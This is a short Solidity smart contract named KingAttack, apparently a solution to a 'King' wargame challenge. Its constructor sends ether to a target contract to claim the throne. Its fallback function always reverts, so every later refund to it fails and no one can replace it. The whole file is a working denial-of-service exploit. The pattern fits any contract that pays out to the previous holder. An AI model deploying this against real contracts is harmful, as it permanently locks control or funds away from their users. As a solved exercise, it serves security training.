// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.17;

contract KingAttack {
    constructor(address _kingToAttack) payable {
        _kingToAttack.call{value: msg.value}("");
    }

    fallback() external payable {
        revert("wyd?");
    }
}